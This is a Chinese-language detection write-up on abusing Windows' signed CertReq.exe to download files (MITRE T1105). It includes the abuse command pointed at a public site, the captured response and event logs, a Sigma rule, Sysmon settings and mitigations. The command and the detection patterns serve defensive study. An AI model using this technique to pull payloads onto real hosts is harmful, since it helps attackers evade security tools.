# T1105-Win-入口工具转移-CertReq.exe(白名单)

## 描述

攻击者利用合法工具`CertReq.exe`从外部系统将工具或恶意文件转移到被攻陷环境（T1105），以实现工具部署或恶意软件分发。`CertReq.exe`是Windows内置组件，设计用于请求证书、检索CA响应或处理证书请求文件。攻击者可通过滥用其`-Post`和`-config`参数，将HTTP POST请求发送至外部URL（如`https://www.baidu.com/`），将响应内容保存为本地文件（如`output.txt`），从而下载恶意文件。由于`CertReq.exe`为白名单程序且由Microsoft签名，易被恶意利用以规避传统防病毒检测。

此技术适用于Windows Vista及以上版本，需用户权限即可执行。检测重点在于监控`CertReq.exe`的异常命令行参数（包含HTTP URL）、网络请求及文件创建行为。

## 测试案例

1. **CertReq文件下载**  
   使用`CertReq.exe`通过HTTP POST从远程URL下载文件，模拟工具转移。  
2. **配置文件伪造**  
   利用`win.ini`作为占位符，触发HTTP请求并保存响应。  

### 示例命令
- **触发下载**（需用户权限）：
  ```cmd
  CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
  ```
- **清理**：
  ```cmd
  del output.txt
  ```

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录`CertReq.exe`进程创建及命令行参数（若启用）。  

**Sysmon日志**  
- **事件ID 1**：记录`CertReq.exe`进程创建，捕获命令行参数。  
- **事件ID 3**：记录网络连接，捕获`CertReq.exe`的HTTP请求（目标IP/端口）。  
- **事件ID 11**：记录输出文件（如`output.txt`）创建。  

**PowerShell日志**  
- **事件ID 4104**：记录若通过PowerShell调用`CertReq.exe`的脚本执行。  

**网络日志**  
- 捕获`CertReq.exe`发起的HTTP POST请求。  

**配置日志记录**  
- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 启用PowerShell日志：`计算机配置 > 管理模板 > Windows组件 > Windows PowerShell > 启用模块日志和脚本块日志记录`。  
- 配置Sysmon监控`CertReq.exe`及文件操作：
  ```xml
  <RuleGroup name="ProcessCreate" groupRelation="and">
    <ProcessCreate onmatch="include">
      <Image condition="end with">certreq.exe</Image>
    </ProcessCreate>
  </RuleGroup>
  <RuleGroup name="FileCreate" groupRelation="and">
    <FileCreate onmatch="include">
      <TargetFilename condition="is not">c:\windows\win.ini</TargetFilename>
    </FileCreate>
  </RuleGroup>
  ```
- 配置IDS/IPS记录HTTP流量。

## 测试复现

### 环境准备
- **靶机**：Windows 10/11或Windows Server 2016/2022（支持Vista及以上）。  
- **权限**：用户权限（无需管理员）。  
- **工具**：`CertReq.exe`（系统自带，路径`C:\Windows\System32\certreq.exe`或`C:\Windows\SysWOW64\certreq.exe`）、Sysmon、Wireshark、测试Web服务器（如`https://www.baidu.com`）。  
- **网络**：可控网络环境，允许HTTPS出站流量。  
- **日志**：启用Windows安全日志、Sysmon日志，配置网络监控。  

### 攻击步骤
1. **触发下载** 

```YML
C:\Users\liyang\Desktop\asptest>CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
OK
HTTP/1.1 200 OK
Cache-Control: max-age=86400
Date: Mon, 18 Apr 2022 06:28:15 GMT
Content-Length: 19825
Content-Type: text/html
Expires: Tue, 19 Apr 2022 06:28:15 GMT
Last-Modified: Wed, 10 Mar 2021 06:27:44 GMT
Accept-Ranges: bytes
ETag: "4d71-5bd28c3bf7800"
P3P: CP=" OTI DSP COR IVA OUR IND COM "
Server: Apache
Set-Cookie: BAIDUID=4305E8F795AE7B64177F5105CD755190:FG=1; expires=Tue, 18-Apr-23 06:28:15 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1
Vary: Accept-Encoding,User-Agent
```

**注意**：测试需在合法授权环境进行，替换URL为测试服务器。

## 测试留痕

```YML
已创建新进程。
创建者主题:
安全 ID: DESKTOP-PT656L6\liyang
帐户名: liyang
帐户域: DESKTOP-PT656L6
登录 ID: 0x47126
进程信息:
新进程 ID: 0x1778
新进程名称: C:\Windows\System32\certreq.exe
令牌提升类型: %%1938
强制性标签: Mandatory Label\Medium Mandatory Level
创建者进程 ID: 0x24b4
创建者进程名称: C:\Windows\System32\cmd.exe
进程命令行: CertReq  -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
```

## 检测方法/思路

### Sigma规则

基于Sigma规则（`win_susp_certreq_download`），检测`CertReq.exe`的异常下载行为：

```yml
title: Suspicious Certreq Command to Download
id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b
status: experimental
description: Detects suspicious Certreq execution that may be abused to download files via HTTP POST.
author: Christian Burkard
date: 2021/11/24
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certreq/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certreq.exe'
    CommandLine|contains|all:
      - ' -Post '
      - ' -config '
      - ' http'
      - ' C:\windows\win.ini '
  condition: selection
fields:
  - CommandLine
  - ParentCommandLine
tags:
  - attack.command_and_control
  - attack.t1105
falsepositives:
  - Legitimate certificate management by administrators
level: high
```

### 检测思路
1. **进程监控**：
   - 检查`CertReq.exe`的命令行参数是否包含`-Post`、`-config`和HTTP/HTTPS URL。
   - 监控异常父进程（如`cmd.exe`、`powershell.exe`）。
2. **网络监控**：
   - 检测`CertReq.exe`发起的HTTP/HTTPS POST请求，重点关注非预期目标URL。
3. **文件监控**：
   - 检查`CertReq.exe`创建的非预期文件（如`output.txt`）。
4. **异常行为**：
   - 检测`CertReq.exe`在非证书管理场景下的运行（如普通用户运行、异常时间点）。
5. **关联分析**：
   - 结合Sysmon事件ID 1（进程创建）、3（网络连接）和11（文件创建）进行关联，识别完整攻击链。

### 检测建议
- **告警规则**：基于Sigma规则，配置SIEM系统（如Splunk、Elastic）检测`CertReq.exe`的异常命令行参数。
- **基线对比**：建立`CertReq.exe`的正常使用基线（如证书管理场景），排除合法行为。
- **网络白名单**：限制`CertReq.exe`的出站流量，仅允许访问已知CA服务器。
- **文件完整性监控**：监控`CertReq.exe`生成的文件，检测异常文件扩展名或内容。

## 缓解措施
1. **限制网络访问**：
   - 配置防火墙，限制`CertReq.exe`的出站HTTP/HTTPS流量，仅允许访问合法CA服务器。
2. **加强日志监控**：
   - 确保启用命令行参数记录和Sysmon日志，覆盖进程、网络和文件操作。
3. **白名单管理**：
   - 使用应用白名单工具（如AppLocker）限制`CertReq.exe`的执行场景。
4. **用户权限管理**：
   - 限制普通用户运行`CertReq.exe`，仅允许证书管理相关账户使用。
5. **定期审查**：
   - 检查系统内`CertReq.exe`的异常使用记录，结合威胁情报分析潜在风险。

## 参考推荐
- MITRE ATT&CK: T1105    
  <https://attack.mitre.org/techniques/T1105/>
- LOLBAS - CertReq.exe  
  <https://lolbas-project.github.io/lolbas/Binaries/Certreq/>
- Microsoft CertReq文档  
  <https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1>
- Sigma规则 - win_susp_certreq_download  
  <https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_certreq_download.yml>
